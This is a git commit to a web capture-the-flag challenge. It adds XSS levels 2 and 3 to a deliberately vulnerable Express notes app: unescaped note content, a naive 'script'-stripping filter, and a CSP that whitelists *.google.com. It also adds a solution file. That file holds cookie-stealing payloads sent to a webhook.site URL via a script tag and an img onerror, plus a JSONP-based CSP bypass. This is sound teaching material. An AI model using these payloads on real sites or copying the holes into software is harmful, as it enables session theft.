d328fdc442488c6898c94467835cc032b043fedf
Lam Jun Rong <junron1@outlook.com>
2020-11-22 21:55:42 +0800

    Add XSS 2 and 3

--- challenges/web/xss/index.js
+++ challenges/web/xss/index.js
@@ -8,30 +8,38 @@ app.use(require('body-parser').urlencoded({extended: true}));
 
 const state = new Map();
 app.get("/", (req, res) => {
-  const id = crypto.randomBytes(16).toString("hex")
-  state.set(id, []);
-  res.redirect("/" + id);
+  res.redirect("/1");
 });
 
-app.get("/:uid", (req, res) => {
+app.get("/:level/", (req, res) => {
+  const id = crypto.randomBytes(16).toString("hex")
+  state.set(id, []);
+  res.redirect("/" + req.params.level + "/" + id);
+});
+
+app.get("/:level/:uid", (req, res) => {
   const id = req.params.uid;
+  const level = req.params.level;
   if (!state.has(id)) {
-    res.redirect("/");
+    res.redirect("/" + level);
     return;
   }
-  const notes = state.get(id);
+  const notes = state.get(id).filter(note => note.level === level);
   let html = "<h1>Your notes</h1><ul>"
   for (const note of notes) {
-    html += `<li><a href="/${id}/${note.id}">${xss(note.title)}</a></li>`
+    html += `<li><a href="/${level}/${id}/${note.id}">${xss(note.title)}</a></li>`
   }
   if (notes.length === 0) {
     html += "<li>You currently have no notes.</li>"
   }
-  html += `</ul><a href="/${id}/new">Create a new note</a>`
+  html += `</ul><a href="/${level}/${id}/new">Create a new note</a>`
+  if (parseInt(level) === 3) {
+    res.set("Content-Security-Policy", "default-src 'self'; script-src https://*.google.com; object-src 'none'; frame-src 'none'")
+  }
   res.send(html);
 });
 
-app.get("/:uid/new", (req, res) => {
+app.get("/:level/:uid/new", (req, res) => {
   res.send(`
   <form method="post">
   <label>Title:</label>
@@ -43,66 +51,80 @@ app.get("/:uid/new", (req, res) => {
   `);
 });
 
-app.post("/:uid/new", (req, res) => {
+app.post("/:level/:uid/new", (req, res) => {
   const id = req.params.uid;
+  const level = req.params.level;
   if (!state.has(id)) {
-    res.redirect("/");
+    res.redirect("/" + level);
     return;
   }
-  const {content, title} = req.body;
+  let {content, title} = req.body;
+  if (parseInt(level) === 2) {
+    while (content.includes("script")) {
+      content = content.replace("script", "");
+    }
+  }
   if (content && title) {
     const noteId = crypto.randomBytes(16).toString("hex")
     const notes = state.get(id);
-    state.set(id, [...notes, {content, title, id: noteId}]);
-    res.redirect(`/${id}/${noteId}`)
+    state.set(id, [...notes, {content, title, level, id: noteId}]);
+    res.redirect(`/${level}/${id}/${noteId}`)
   } else {
     res.end("Bad")
   }
 });
-app.get("/:uid/:noteId", (req, res) => {
+
+app.get("/:level/:uid/:noteId", (req, res) => {
   const id = req.params.uid;
+  const level = req.params.level;
   if (!state.has(id)) {
-    res.redirect("/");
+    res.redirect("/" + level);
     return;
   }
   const notes = state.get(id);
-  const note = notes.filter(note => note.id == req.params.noteId);
+  const note = notes.filter(note => note.id === req.params.noteId && note.level === level);
   if (note.length === 0) {
-    res.redirect("/" + id);
+    res.redirect("/" + level + "/" + id);
     return;
+  }
+  if (parseInt(level) === 3) {
+    res.set("Content-Security-Policy", "default-src 'self'; script-src https://*.google.com; object-src 'none'; frame-src 'none'")
   }
   res.send(`
   <h1>${xss(note[0].title)}</h1>
   ${note[0].content}<br><br>
-  <a href="/${id}">Back to notes</a><br>
-   <a href="/${id}/${note[0].id}/report">Report this note to the admin</a>
+  <a href="/${level}/${id}">Back to notes</a><br>
+   <a href="/${level}/${id}/${note[0].id}/report">Report this note to the admin</a>
   `);
 });
 
-app.get("/:uid/:noteId/report", async (req, res) => {
+app.get("/:level/:uid/:noteId/report", async (req, res) => {
   const id = req.params.uid;
+  const level = req.params.level;
+  if (parseInt(level) < 1 || parseInt(level) > 3) {
+    return res.end("Invalid level");
+  }
   if (!state.has(id)) {
-    res.redirect("/");
+    res.redirect("/" + level);
     return;
   }
   const notes = state.get(id);
-  const note = notes.filter(note => note.id == req.params.noteId);
+  const note = notes.filter(note => note.id === req.params.noteId && note.level === level);
   if (note.length === 0) {
-    res.redirect("/" + id);
+    res.redirect("/" + level + "/" + id);
     return;
   }
-  const origin = "http://34.68.146.67:1238"
-  const url = origin + `/${id}/${req.params.noteId}`;
+  const origin = "http://localhost:1238"
+  const url = origin + `/${level}/${id}/${req.params.noteId}`;
 
   const cookies = [{
     name: "flag",
-    value: fs.readFileSync("flag.txt").toString().trim(),
+    value: fs.readFileSync(`flag${level}.txt`).toString().trim(),
     url: origin
   }];
-  console.log(url)
+  console.log(url, level);
   await pup(url, cookies);
-  res.end("The admin has visited your note. It has been removed to prevent spam.")
-  state.set(id, notes.filter(note => note.id !== req.params.noteId))
+  res.end("The admin has visited the note.")
 })
 
 app.listen(1238);
---
+++ challenges/web/xss/solution.md
@@ -0,0 +1,32 @@
+## XSS 1
+
+Level 1 has no protections at all.  
+Payload:
+```html
+<script>
+  fetch("https://webhook.site/56132684-a245-4f7c-95ee-25f2484e9bf8/"+ btoa(document.cookie));
+</script>
+```
+
+## XSS 2
+
+In level 2, script tags are stripped. However, image tags with event handlers can be used instead.  
+Payload:
+```html
+<img
+  src="random"
+  onerror='fetch("https://webhook.site/56132684-a245-4f7c-95ee-25f2484e9bf8/"+ btoa(document.cookie));'
+/>
+```
+
+## XSS 3
+
+In level 3, there is a restrictive CSP. However, `*.google.com` is allowed, allowing for JSONP to be exploited.  
+Even though we have RCE, we are not done as we are unable to connect to other sites. We can leverage the site itself,
+using fetch to create a note.
+Payload:
+```html
+<script
+  src='https://accounts.google.com/o/oauth2/revoke?callback=fetch("http://localhost:1238/3/453de579aeb336b827c97c6b71a06903/new",{method: "POST",body:function(){a=new FormData();a.append("title","flag");a.append("content",document.cookie);return new URLSearchParams(a)}()})'>
+</script>
+```
